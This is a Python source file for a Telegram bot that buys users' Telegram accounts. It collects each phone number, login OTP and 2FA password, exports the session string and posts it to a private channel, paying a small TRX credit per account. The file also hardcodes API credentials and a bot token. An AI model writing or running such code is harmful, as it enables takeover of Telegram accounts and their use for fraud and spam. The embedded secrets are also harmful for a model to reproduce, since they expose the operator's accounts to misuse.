from pyrogram import Client, filters
from pyrogram.types import Message, ReplyKeyboardMarkup
import os
import json
from fastapi import FastAPI
import uvicorn
import asyncio
import threading

# ================= Bot credentials =================
api_id = 23347107
api_hash = "8193110bf32a08f41ac6e9050b2a4df4"
bot_token = "8289273826:AAFZsDmES8vzZB5qdX5PQrA3twWZdN7sUJs"
admin_id = 7051377916
withdraw_channel = -1002437499884
session_channel = -1002784748324

# ================= File names =================
USED_NUMBERS_FILE = "used_numbers.json"
USER_DATA_FILE = "user_data.json"

# ================= Initialize files if not exist =================
if not os.path.exists(USED_NUMBERS_FILE):
    with open(USED_NUMBERS_FILE, "w") as f:
        json.dump([], f)

if not os.path.exists(USER_DATA_FILE):
    with open(USER_DATA_FILE, "w") as f:
        json.dump({}, f)

# ================= Helpers =================
def load_used_numbers():
    with open(USED_NUMBERS_FILE, "r") as f:
        return json.load(f)

def save_used_number(phone):
    numbers = load_used_numbers()
    numbers.append(phone)
    with open(USED_NUMBERS_FILE, "w") as f:
        json.dump(numbers, f)

def delete_used_number(phone):
    numbers = load_used_numbers()
    if phone in numbers:
        numbers.remove(phone)
        with open(USED_NUMBERS_FILE, "w") as f:
            json.dump(numbers, f)

def load_user_data():
    with open(USER_DATA_FILE, "r") as f:
        return json.load(f)

def save_user_data(data):
    with open(USER_DATA_FILE, "w") as f:
        json.dump(data, f)

def update_balance(user_id, amount):
    data = load_user_data()
    user_id = str(user_id)
    if user_id not in data:
        data[user_id] = {"balance": 0.0, "wallet": "", "added": 0}
    data[user_id]["balance"] += amount
    data[user_id]["added"] += 1
    save_user_data(data)

def get_user_balance(user_id):
    data = load_user_data()
    return data.get(str(user_id), {}).get("balance", 0.0)

def set_wallet(user_id, address):
    data = load_user_data()
    user_id = str(user_id)
    if user_id not in data:
        data[user_id] = {"balance": 0.0, "wallet": "", "added": 0}
    data[user_id]["wallet"] = address
    save_user_data(data)

def get_wallet(user_id):
    data = load_user_data()
    return data.get(str(user_id), {}).get("wallet", "Not set")

def get_added_count(user_id):
    data = load_user_data()
    return data.get(str(user_id), {}).get("added", 0)

# ================= Bot initialization =================
rate = 0.18
bot = Client("bot", api_id=api_id, api_hash=api_hash, bot_token=bot_token)
sessions = {}

# ================= Main Menu Buttons =================
main_menu = ReplyKeyboardMarkup(
    keyboard=[
        ["📱 Sell Number"],
        ["💰 My Account", "🔗 Add Wallet"],
        ["💸 Withdraw"],
    ],
    resize_keyboard=True
)

# ================= FastAPI app for ping =================
app = FastAPI()

@app.get("/")
async def root():
    return {"status": "Bot is running"}

def run_fastapi():
    uvicorn.run(app, host="0.0.0.0", port=8000)

# ================= Pyrogram Handlers =================
@bot.on_message(filters.command("start"))
async def start(_, m: Message):
    await m.reply("👋 Welcome to the Bot!", reply_markup=main_menu)

@bot.on_message(filters.text)
async def handle_text(_, m: Message):
    user_id = m.from_user.id
    text = m.text
    user = sessions.get(user_id, {})

    if text == "📱 Sell Number":
        await m.reply("📞 Send your phone number Example +88017XXXX4567:")
        sessions[user_id] = {"step": "wait_phone"}
    elif text == "💰 My Account":
        bal = get_user_balance(user_id)
        count = get_added_count(user_id)
        await m.reply(f"💰 Balance: ${bal:.2f}\n📦 Total Added: {count}")
    elif text == "🔗 Add Wallet":
        await m.reply("🔗 Send your TRX wallet address:")
        sessions[user_id] = {"step": "wait_wallet"}
    elif text == "💸 Withdraw":
        bal = get_user_balance(user_id)
        if bal >= 2:
            wallet = get_wallet(user_id)
            count = get_added_count(user_id)
            await bot.send_message(withdraw_channel,
                f"💸 Withdraw Request\n👤 User: {m.from_user.mention} ({user_id})\n💰 Amount: ${bal:.2f}\n🔗 Wallet: {wallet}\n📦 Added: {count}")
            update_balance(user_id, -bal)
            await m.reply("✅ Withdraw request sent.")
        else:
            await m.reply("❌ Minimum withdraw is $2.00")

    # Handle steps
    elif user.get("step") == "wait_wallet":
        set_wallet(user_id, text.strip())
        await m.reply("✅ Wallet set successfully.")
        sessions.pop(user_id, None)

    elif user.get("step") == "wait_phone":
        phone = text.strip()
        if phone in load_used_numbers():
            await m.reply("⚠️ This number is already used.")
            sessions.pop(user_id, None)
            return

        user["phone"] = phone
        user["step"] = "wait_code"
        user["client"] = Client(f"session_{user_id}", api_id=api_id, api_hash=api_hash, phone_number=phone, in_memory=True)

        try:
            await user["client"].connect()
            sent = await user["client"].send_code(phone)
            user["code_hash"] = sent.phone_code_hash
            await m.reply("📨 OTP sent! Now send the code:")
        except Exception as e:
            await m.reply(f"❌ Failed to send OTP: {e}")
            await user["client"].disconnect()
            sessions.pop(user_id, None)

    elif user.get("step") == "wait_code":
        code = text.strip()
        phone = user["phone"]
        client = user["client"]

        try:
            try:
                await client.sign_in(phone, user["code_hash"], code)
            except Exception as e:
                if "PASSWORD_HASH_INVALID" in str(e) or "SESSION_PASSWORD_NEEDED" in str(e):
                    user["step"] = "wait_password"
                    await m.reply("🔐 This account has 2FA enabled.\nPlease send the password:")
                    return
                else:
                    raise e

            # No password needed
            string_session = await client.export_session_string()
            save_used_number(phone)
            update_balance(user_id, rate)
            count = get_added_count(user_id)

            await bot.send_message(session_channel,
                f"✅ New Session\n"
                f"👤 User: {m.from_user.mention}\n"
                f"📱 Number: {phone}\n"
                f"📦 Total: {count}\n\n"
                f"<code>{string_session}</code>"
            )
            await m.reply(f"✅ Login Done and ${rate:.2f} added.")
        except Exception as e:
            await m.reply(f"❌ Login failed: {e}")
            await client.disconnect()
            sessions.pop(user_id, None)

    elif user.get("step") == "wait_password":
        try:
            await user["client"].check_password(text.strip())
            string_session = await user["client"].export_session_string()
            save_used_number(user["phone"])
            update_balance(user_id, rate)
            count = get_added_count(user_id)

            await bot.send_message(session_channel,
                f"✅ New 2FA Session\n"
                f"👤 User: {m.from_user.mention}\n"
                f"📱 Number: {user['phone']}\n"
                f"📦 Total: {count}\n\n"
                f"<code>{string_session}</code>"
            )
            await m.reply(f"🔐 2FA session created and ${rate:.2f} added.")
        except Exception as e:
            await m.reply(f"❌ Password failed: {e}")
        finally:
            await user["client"].disconnect()
            sessions.pop(user_id, None)

# ================= Run bot and FastAPI =================
def run_bot():
    bot.run()

if __name__ == "__main__":
    # Run FastAPI in a thread
    threading.Thread(target=run_fastapi, daemon=True).start()
    # Run Pyrogram bot in main thread
    run_bot()
